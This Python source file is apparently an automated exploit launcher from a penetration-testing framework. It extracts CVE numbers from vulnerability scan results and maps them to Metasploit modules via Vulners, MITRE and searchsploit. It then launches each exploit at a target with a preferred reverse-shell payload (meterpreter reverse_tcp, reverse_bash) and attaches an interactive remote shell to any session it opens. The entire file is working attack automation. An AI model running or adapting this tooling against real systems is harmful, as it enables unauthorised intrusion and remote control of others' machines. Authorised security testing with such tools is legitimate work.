import json
import re
import asyncio
import time
import os
import subprocess
import requests
import sys

from pymetasploit3.msfrpc import MsfRpcClient
from core import logger, config
from colorama import Fore, Style


MSF_PASSWORD = config.get_config_value("MSF_PASSWORD", "exploit_launcher")
MSF_SERVER = config.get_config_value("MSF_SERVER", "exploit_launcher")
MSF_PORT = config.get_config_value("MSF_PORT", "exploit_launcher")
LHOST = config.get_config_value("LHOST", "exploit_launcher")
LPORT = config.get_config_value("LPORT", "exploit_launcher")
CHOST = config.get_config_value("CHOST", "exploit_launcher")
CPORT = config.get_config_value("CPORT", "exploit_launcher")
VULNERS_API_FILE = config.frm_path + '/' + config.get_config_value("VULNERS_API_FILE", "exploit_launcher")
VULNERS_API_URL = config.get_config_value("VULNERS_API_URL", "exploit_launcher")
CVE_DATABASE = config.get_config_value("CVE_DATABASE", "exploit_launcher")
MITRE_API_URL = config.get_config_value("MITRE_API_URL", "exploit_launcher")


def load_api_key(file):
    data = ""
    with open(file, "r") as f:
        data = f.read()
    f.close()
    return data.strip()
        
VULNERS_API_KEY = load_api_key(VULNERS_API_FILE)


def start_msfrpcd():
    result = subprocess.run(["pgrep", "-f", "msfrpcd"], capture_output=True, text=True)
    
    if result.stdout.strip():
        logger.log(f"{Fore.LIGHTBLUE_EX}[+]{Style.RESET_ALL} Metasploit RPC is already running.")
        return
    
    logger.log(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Starting Metasploit RPC server...")

    command = [
        "msfrpcd", 
        "-P", MSF_PASSWORD,  
        "-U", "msf",  
        "-p", str(MSF_PORT),  
        "-a", MSF_SERVER,  
        "-S"
    ]
    subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    time.sleep(5)

# ----------------------
#    METASPLOIT - RPC
# ----------------------

def connect_to_metasploit():
    start_msfrpcd()

    logger.debug(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Connecting to Metasploit RPC at {MSF_SERVER}:{MSF_PORT}...")
    client = MsfRpcClient(MSF_PASSWORD, server=MSF_SERVER, port=MSF_PORT)
    logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Connected to Metasploit RPC!")
    
    return client


# ------------------------
#       VULNERS API
# ------------------------

def fetch_vulners_exploit(cve):
    headers = {"User-Agent": "Mozilla/5.0", "X-Vulners-Api-Key": VULNERS_API_KEY}
    params = {"query": f"cve:{cve}"}
    
    try:
        response = requests.get(VULNERS_API_URL, params=params, headers=headers)
        response.raise_for_status() 

        data = response.json()

        if "data" not in data or "search" not in data["data"]:
            logger.log(f"[!] Unexpected Vulners response for {cve}: {data}")
            return []

        exploits = [res["id"] for res in data["data"]["search"] if res.get("type") == "exploit"]

        return exploits if exploits else []

    except ValueError:
        logger.debug(f"[!] Failed to decode Vulners API JSON response for {cve}")
        return []

    except Exception as e:
        logger.debug(f"[!] Vulners API request failed: {e}")
        return []
    
def load_vuln_results():
    if not os.path.exists(config.vuln_cache_file):
        logger.log("[-] No cached vuln results")
        return None 
    try:
        with open(config.vuln_cache_file, 'r') as f:
            file_content = f.read()  
            if not file_content.strip(): 
                logger.log("[!] Cached vuln results file is empty.")
                return None
            results = json.loads(file_content) 

        logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Loaded cached vuln results.")
        return results

    except json.JSONDecodeError as e:
        logger.log(f"[!] JSON Error loading cache: {e}")
        return None
    except Exception as e:
        logger.log(f"[!] Unexpected error loading cache: {e}")
        return None
    
# ------------------------
#       Exploit-DB
# ------------------------

def fetch_all_exploits():
    exploits = {}

    metasploit_exploits = client.modules.search("exploit")
    for exp in metasploit_exploits:
        exploits[exp["fullname"]] = exp.get("description", "")

    command = ["searchsploit", "--json"]
    process = subprocess.run(command, capture_output=True, text=True)
    
    try:
        results = json.loads(process.stdout).get("RESULTS", [])
        for exp in results:
            exploits[exp["Title"]] = exp["Description"]
    except json.JSONDecodeError:
        pass

    return exploits

# --------------------
#    RUN MS EXPLOIT
# --------------------

def run_msf_exploit_console(exploit, target, lhost, lport, host_var, port_var, payload=None):
    logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Launching Metasploit exploit: {Fore.LIGHTMAGENTA_EX}{exploit}{Style.RESET_ALL} against {Fore.LIGHTYELLOW_EX}{target}{Style.RESET_ALL}")

    console = client.consoles.console()
    console.write(f"use {exploit}\n")
    time.sleep(1)

    if payload:
        console.write(f"set PAYLOAD {payload}\n")

    console.write(f"set RHOSTS {target}\n")
    console.write(f"set {host_var} {lhost}\n")
    console.write(f"set {port_var} {lport}\n")

    console.write("exploit -j\n")  
    time.sleep(2) 

    max_wait_time = 30
    interval = 1
    elapsed_time = 0

    while elapsed_time < max_wait_time:
        output = console.read()
        if isinstance(output, dict):  
            output = output.get("data", "")
        output = str(output).strip()  
        if output and config.debug:
            logger.debug(f"{Fore.LIGHTBLUE_EX}[MSF] {output}{Style.RESET_ALL}") 

        if "Exploit failed" in output or "options failed" in output or "aborted" in output.lower():
            logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} Exploit {Fore.LIGHTMAGENTA_EX}{exploit}{Style.RESET_ALL} failed.")
            break 

        if "no session" in output:
            time.sleep(5)
            break

        sessions = client.sessions.list
        if sessions:
            break 

        time.sleep(interval)
        elapsed_time += interval
        print(f"{Fore.LIGHTYELLOW_EX}[*]{Style.RESET_ALL} Waiting for session... ({elapsed_time}s elapsed)", end='\r')

    sessions = client.sessions.list
    if sessions:
        session_id = list(sessions.keys())[0]
        logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Found active session: {Fore.LIGHTCYAN_EX}{session_id}{Style.RESET_ALL}. Attaching...")

        shell = client.sessions.session(session_id)
        shell.write("whoami\n")
        time.sleep(1)
        logger.log("\n")
        user = shell.read()
        if not user:
            user = "shell"
        shell_cmd = user.strip() + "> "

        while True:
            cmd = input(shell_cmd)
            if cmd.lower() in ["exit", "quit"]:
                logger.log(f"{Fore.LIGHTRED_EX}[*]{Style.RESET_ALL} Exiting interactive session.")
                client.sessions.session(session_id).stop()
                break
            shell.write(cmd + "\n")
            time.sleep(1)
            logger.log(shell.read())

    else:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} No active session found for {Fore.LIGHTMAGENTA_EX}{exploit}{Style.RESET_ALL}.")


def get_valid_payload(exploit_module):
    try:
        all_payloads = client.modules.use('exploit', exploit_module).payloads
        preferred_payloads = [
            "linux/x64/meterpreter/reverse_tcp",
            "generic/shell_reverse_tcp",
            "cmd/unix/reverse",
            "cmd/unix/reverse_bash"
        ]

        for payload in preferred_payloads:
            if payload in all_payloads:
                return payload

        return all_payloads[0] if all_payloads else None

    except Exception as e:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} Failed to fetch payloads for {exploit_module}: {e}")
        return None

def get_payload_options(payload):
    payload_module = client.modules.use("payload", payload)
    return payload_module.options


def run_exploit(target, exploit_module, use_metasploit=True, use_netcat=False):
    try:
        logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} Setting options for {Fore.LIGHTMAGENTA_EX}{exploit_module}{Style.RESET_ALL}")

        exploit = client.modules.use('exploit', exploit_module)
        
        payload = get_valid_payload(exploit_module)

        exploit_options = exploit.options
        
        payload_options = get_payload_options(payload)

        local_port = None
        local_host = None
        host_var = "LHOST"
        port_var = "LPORT"


        if "RHOSTS" in exploit_options:
            exploit["RHOSTS"] = target
            logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} RHOSTS => {target}")
        if "CHOST" in exploit_options:
            exploit["CHOST"] = CHOST
            local_host = CHOST
            host_var = "CHOST"
            logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} CHOST => {CHOST}")
        if "CPORT" in exploit_options:
            exploit["CPORT"] = CPORT
            local_port = CPORT
            port_var = "CPORT"
            logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} CPORT => {CPORT}")
        if "LHOST" in exploit_options or "LHOST" in payload_options:
            local_host = LHOST
            port_var = "LPORT"
            logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} LHOST => {LHOST}")
        if "LPORT" in exploit_options or "LPORT" in payload_options:
            host_var = "LHOST"
            local_port = LPORT
            logger.log(f"{Fore.LIGHTYELLOW_EX}[+]{Style.RESET_ALL} LPORT => {LPORT}")


        if not local_host or not local_port:
            logger.log(f"[-] Exploit {exploit_module} failed to setup.")
            return
        
        run_msf_exploit_console(exploit_module, target, local_host, local_port, host_var, port_var, payload)
    
    except Exception as e:
        logger.log(f"{Fore.LIGHTRED_EX}[-]{Style.RESET_ALL} Exploit {Fore.LIGHTMAGENTA_EX}{exploit_module}{Style.RESET_ALL} failed: {e}")
        return


def fetch_cve_mappings(cve):
    response = requests.get(f"{MITRE_API_URL}{cve}")
    
    if response.status_code == 200:
        data = response.json()
        affected = data.get("containers", {}).get("cna", {}).get("affected", [])

        vendors = [
            entry.get("vendor", "").strip()
            for entry in affected if entry.get("vendor", "").lower() != "n/a"
        ]

        if vendors:
            return vendors[0] 

        logger.debug(f"[!] No vendor found for {cve}")
        return ""
    else:
        logger.debug(f"[!] Failed to fetch data for {cve}")
        return ""
    

def load_cve_mappings():
    if not os.path.exists(CVE_DATABASE):
        return {}

    try:
        with open(CVE_DATABASE, "r") as f:
            return json.load(f)
    except json.JSONDecodeError:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} Failed to load CVE mappings database: JSON file is corrupted. Removing.")
        os.remove(CVE_DATABASE)
        return {}

def save_cve_mappings(cve_mappings):
    with open(CVE_DATABASE, "w") as f:
        json.dump(cve_mappings, f, indent=4)
    

def extract_cves(results):
    cves = set()
    if isinstance(results, dict):
        for value in results.values():
            cves.update(extract_cves(value))
    elif isinstance(results, list):
        for item in results:
            cves.update(extract_cves(item))
    elif isinstance(results, str):
        found_cves = re.findall(r"CVE-\d{4}-\d{4,7}", results)
        cves.update(found_cves)
    return list(cves)
    

def search_for_exploits(cve_list, target):
    cve_count = len(cve_list)
    counter = 1
    already_tested = []
    missing_cves = []
    cve_mappings = load_cve_mappings()
    number_cve_mappings = len(cve_mappings)
    logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Loaded {Fore.LIGHTCYAN_EX}{number_cve_mappings}{Style.RESET_ALL} CVE mappings.")
    if cve_mappings:
        missing_cves = [cve for cve in cve_list if cve not in cve_mappings]
    
        for cve in cve_list:
            if cve in cve_mappings and cve_mappings[cve] not in already_tested:
                already_tested.append(cve_mappings[cve])
                run_exploit(target, cve_mappings[cve])
                counter += 1
            
            print(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Tested ({Fore.LIGHTCYAN_EX}{counter}/{cve_count}{Style.RESET_ALL}) CVE numbers", end='\r')
    
    if not cve_mappings:
        missing_cves = cve_list

    for cve in missing_cves:
        cve_exploit = search_metasploit_exploit(cve)
        if cve_exploit and cve_exploit not in already_tested:
            already_tested.append(cve_exploit)
            cve_mappings[cve] = cve_exploit
            save_cve_mappings(cve_mappings)
            run_exploit(target, cve_exploit)

        else:
            vendor = fetch_cve_mappings(cve)
            vendor_exploit = search_metasploit_exploit(vendor)

            if vendor_exploit and vendor_exploit not in already_tested:
                already_tested.append(vendor_exploit)
                cve_mappings[cve] = vendor_exploit
                save_cve_mappings(cve_mappings)
                run_exploit(target, vendor_exploit)
        
        print(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Tested ({Fore.LIGHTCYAN_EX}{counter}/{cve_count}{Style.RESET_ALL}) CVE numbers", end='\r')
        counter += 1

def search_metasploit_exploit(cve):
    exploits = client.modules.search(cve) 

    ranked_exploits = [exp for exp in exploits if exp.get('rank', '').lower() in ['excellent', 'great']]

    if ranked_exploits:
        best_exploit = ranked_exploits[0]['fullname']
        logger.debug(f"[+] Found exploit for {cve}: {best_exploit}")
        return best_exploit

    logger.debug(f"[-] No high-quality exploits found for {cve}")
    return ""


def init_launcher():
    global client
    try:
        client = connect_to_metasploit()
    except Exception as e:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} Failed to connect to Metasploit RPC: {e}")
        sys.exit(1)

    logger.log(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Preloading exploit-db")
    try:
        exploits = fetch_all_exploits()
        logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Loaded {Fore.LIGHTCYAN_EX}{len(exploits)}{Style.RESET_ALL} exploits.")
    except Exception as e:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} Failed to fetch exploits: {e}")
        exploits = {}


async def exploit_from_cve_results(target, cve_data):
    init_launcher()
    global total_cves, tested_vulnerabilities
    tested_vulnerabilities = 0


    if not cve_data and os.path.exists(config.vuln_cache_file):
        with open(config.vuln_cache_file, "r") as f:
            cve_data = json.load(f)
        logger.log(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Loaded cached CVE results.")
    elif not cve_data:
        logger.log(f"{Fore.LIGHTRED_EX}[!]{Style.RESET_ALL} No CVE data found to exploit.")
        return
    
    cves = extract_cves(cve_data)

    total_cves = len(cves)
    logger.log(f"{Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} ({Fore.LIGHTCYAN_EX}{total_cves}{Style.RESET_ALL}) vulnerabilities found.")

    
    search_for_exploits(cves, target)

    logger.log(f"{Fore.LIGHTGREEN_EX}[*]{Style.RESET_ALL} Exploit launcher finished.")